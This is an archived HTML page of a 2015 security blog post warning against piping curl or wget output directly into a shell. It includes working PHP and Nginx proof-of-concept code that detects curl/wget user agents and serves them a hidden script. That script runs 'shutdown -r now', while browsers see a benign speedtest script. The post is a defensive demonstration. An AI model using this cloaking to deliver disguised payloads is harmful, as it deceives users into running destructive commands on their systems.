<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><meta name=author content="SALVATORE LAMENDOLA (vt0r)"><meta name=description content="Today, we are going to discuss the dangers of sending the output of a curl or wget command directly to your shell. There are already a few examples on why this is dangerous, with a very clear and concise example available herethat explains the dangers of connections closing or failing before the transfer is completed. However, I would like to present a much more malicious example. Sinister, even! I call it &ldquo;The Bait-and-Switch."><meta property="og:title" content="Please Stop curl/wget'ing Directly to bash/sh"><meta property="og:description" content="Today, we are going to discuss the dangers of sending the output of a curl or wget command directly to your shell. There are already a few examples on why this is dangerous, with a very clear and concise example available herethat explains the dangers of connections closing or failing before the transfer is completed. However, I would like to present a much more malicious example. Sinister, even! I call it &ldquo;The Bait-and-Switch."><meta property="og:type" content="article"><meta property="og:url" content="https://lamendola.me/2015/10/09/please-stop-curl-wgeting-directly-to-bash-sh/"><meta property="article:published_time" content="2015-10-09T00:12:03+00:00"><meta property="article:modified_time" content="2015-10-09T00:12:03+00:00"><title>Please Stop curl/wget'ing Directly to bash/sh</title><link rel=canonical href=https://lamendola.me/2015/10/09/please-stop-curl-wgeting-directly-to-bash-sh/><link rel=preload href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Source+Sans+Pro:400&display=swap" as=style onload="this.onload=null;this.rel='stylesheet'"><link rel=stylesheet href=/css/reset.css><link rel=preload href=/css/pygments.css as=style onload="this.onload=null;this.rel='stylesheet'"><link rel=stylesheet href=/css/main.css><link rel="shortcut icon" href=/images/favicon.ico></head><body lang=en><section class=header><div class=container><div class=content><a href=/><img class=avatar src=/images/avatar@2x.png srcset="https://lamendola.me/images/avatar@2x.png 1x"></a>
<a href=/><div class=name>SALVATORE LAMENDOLA (vt0r)</div></a><nav><ul><li class=nav-><a href=https://lamendola.me/about/><span>About</span></a></li><li class=nav-blog><a href=https://lamendola.me/blog/><span>Blog</span></a></li><li class=nav-><a href=https://ip.1a4.fr/><span>What's my IP?</span></a></li><li class=nav-><a href=https://1a4.fr/><span>Encrypted Pastebin</span></a></li></ul></nav></div></div></section><section class=icons><div class=container><div class=content><a href=https://github.com/vt0r target=_blank rel=noopener><img class=icon src=/img/github.svg alt=github></a>
<a href=https://keybase.io/vt0r target=_blank rel=noopener><img class=icon src=/img/keybase.svg alt=keybase></a>
<a href=https://www.linkedin.com/in/salvatorelamendola target=_blank rel=noopener><img class=icon src=/img/linkedin.svg alt=linkedin></a>
<a href=mailto:salvatore[at@@]lamendola[dot..]me><img class=icon src=/img/email.svg alt=email></a></div></div></section><section class="main post non-narrow zero-top-spacing"><div class=container><div class=content><div class=front-matter><div class=title-container><div class=page-heading>Please Stop curl/wget'ing Directly to bash/sh</div><div class=initials><a href=https://lamendola.me></a></div></div><div class=meta><div class=date title="Fri Oct 9 2015 00:12:03 UTC">Oct 9, 2015</div><div class=reading-time><div class=middot></div>4 minutes read</div></div></div><div class=markdown><p>Today, we are going to discuss the dangers of sending the output of a curl or wget command directly to your shell. There are already a few examples on why this is dangerous, with a very clear and concise example available here that explains the dangers of connections closing or failing before the transfer is completed. However, I would like to present a much more malicious example. <em>Sinister, even!</em> I call it &ldquo;The Bait-and-Switch.&rdquo;</p><p>Though this is certainly nothing groundbreaking or even new, this proof of concept is what I hope will end this ridiculous trend of piping downloaded scripts directly to your shell once and for all.</p><p>Take the following URL, for example: <a href=https://1a4.fr/speedtest/>https://1a4.fr/speedtest/</a></p><p>In your browser, the above URL shows a perfectly functional bash script you can use to do some CLI speed tests from DigitalOcean test machines in each of their datacenters. This script will download a 100 MB test file to show basic throughput expectations, and then it will measure the average latency with a series of pings to each test machine. This script by itself is actually quite useful to someone on DigitalOcean or someone considering which datacenter(s) to use in a new setup.</p><p>Now, let&rsquo;s try to grab the same exact URL using <code>curl</code> or <code>wget</code> (but <strong>NOT</strong> piping to bash):</p><div class=highlight><pre style=color:#93a1a1;background-color:#002b36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>curl https://1a4.fr/speedtest/
</code></pre></div><div class=highlight><pre style=color:#93a1a1;background-color:#002b36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>wget -O- https://1a4.fr/speedtest/
</code></pre></div><p>What kind of sourcery is this, you ask? Well, let&rsquo;s just go straight into the explanation. Like I mentioned in the introduction, we wanted to show what happens when there&rsquo;s true malicious intent on the server side. To demonstrate this, a friend and I decided to implement two separate proof of concept solutions to achieve the same bait-and-switch end result. We&rsquo;ll first show his example, written in PHP (he has chosen to remain nameless so you don&rsquo;t associate him with PHP):</p><div class=highlight><pre style=color:#93a1a1;background-color:#002b36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=color:#719e07>&lt;?</span>php

<span style=color:#719e07>if</span> (isset(<span style=color:#268bd2>$_SERVER</span>[<span style=color:#2aa198>&#39;HTTP_USER_AGENT&#39;</span>]))
{
    <span style=color:#268bd2>$useragent</span> <span style=color:#719e07>=</span> strtolower(<span style=color:#268bd2>$_SERVER</span>[<span style=color:#2aa198>&#39;HTTP_USER_AGENT&#39;</span>]);
}

<span style=color:#719e07>if</span> (<span style=color:#719e07>!</span>isset(<span style=color:#268bd2>$useragent</span>) <span style=color:#719e07>||</span> <span style=color:#719e07>empty</span>(<span style=color:#268bd2>$useragent</span>) <span style=color:#719e07>||</span> strpos(<span style=color:#268bd2>$useragent</span>, <span style=color:#2aa198>&#34;curl&#34;</span>) <span style=color:#719e07>!==</span> <span style=color:#719e07>false</span> <span style=color:#719e07>||</span> strpos(<span style=color:#268bd2>$useragent</span>, <span style=color:#2aa198>&#34;wget&#34;</span>) <span style=color:#719e07>!==</span> <span style=color:#719e07>false</span>)
{
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;#!/bin/sh</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;#</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;# If you are reading this, I fucked up or you pay attention to what you are doing. Friends don&#39;t let friends wget/curl into bash.</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;# They don&#39;t prank them while they&#39;re working on their production networks either, so keep that in mind before you link to someone else.</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;#</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;# If you aren&#39;t reading this... well...</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;#</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;# Every host should have shutdown, right? They all run debian and ubuntu anyway...</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34; ping -q -s 90 -c 1 speedtest.gparent.org</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;# We don&#39;t care if this works or not. We made our point</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34; shutdown -r now Attention all currently logged-in users - I have shutdown privileges and executed a shell script without reading its source code</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
    <span style=color:#719e07>echo</span> <span style=color:#2aa198>&#34;exit 0 # Exit cleanly. Very important.</span><span style=color:#cb4b16>\n</span><span style=color:#2aa198>&#34;</span>;
}
<span style=color:#719e07>else</span>
{
    header(<span style=color:#2aa198>&#39;Content-Type: text/plain&#39;</span>);
    readfile(<span style=color:#2aa198>&#34;./script.sh&#34;</span>);
}
<span style=color:#719e07>?&gt;</span>
</code></pre></div><p>As you can see, this is an extremely basic script that will check the user agent string of the browser/client, and if it matches wget, curl or is blank, the malicious script will be presented as the output. Under any other conditions (browsers and some other downloaders that don&rsquo;t rely on wget or curl), the proper script will be presented to your browser, so you can feel all warm and fuzzy about &ldquo;inspecting the source&rdquo; before piping it directly to bash from curl/wget.</p><p>Here&rsquo;s the example I came up with using only Nginx to determine which of two files to serve (one malicious, one not):</p><div class=highlight><pre style=color:#93a1a1;background-color:#002b36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-nginx data-lang=nginx><span style=color:#586e75>## Proof of concept curl|sh bait and switch
</span><span style=color:#586e75></span><span style=color:#719e07>location</span> ~ <span style=color:#dc322f>^/speedtest</span> {
    <span style=color:#719e07>index</span> <span style=color:#2aa198>speedtest.txt</span>;
    <span style=color:#719e07>if</span> <span style=color:#2aa198>(</span><span style=color:#268bd2>$http_user_agent</span> <span style=color:#2aa198>!~*</span> <span style=color:#2aa198>&#39;curl|wget&#39;)</span> {
        <span style=color:#719e07>root</span> <span style=color:#2aa198>/home/speedtest</span>;
    }
    <span style=color:#719e07>root</span> <span style=color:#2aa198>/home/speedtest/malicious</span>;
}
</code></pre></div><p>This example is also quite simple, just like the above PHP version, but it requires only Nginx. To create the necessary directory structure, I created <code>/home/speedtest</code>, which contains <code>speedtest/speedtest.txt</code> and <code>malicious/speedtest/speedtest.txt</code> underneath it. I&rsquo;m sure you can guess which one is the good script and which one is the bad. My example is only matching useragents that contain &lsquo;curl&rsquo; or &lsquo;wget&rsquo; in any case, but leaving any other ones untouched.</p><p>Easy, huh?</p><p>I hope our brief lesson has further implanted into your brain the dangers of piping scripts directly to your shell. Please do your civic duty and tell all your friends to watch out for assholes like myself and my anonymous researcher friend when moving about the interwebs, as you never know when we are out to prove a point (or concept)! We hope you will now at least think twice before piping scripts directly into your shell after downloading, and we&rsquo;d be ecstatic if you <em>STOPPED DOING IT ALTOGETHER, BECAUSE IT&rsquo;S JUST PLAIN STUPID</em>. This concludes our PSA.</p><br><p class=back-to-posts><a href=/blog>Back to posts</a></p></div><br><div class=disqus></div></div></div></section></body></html>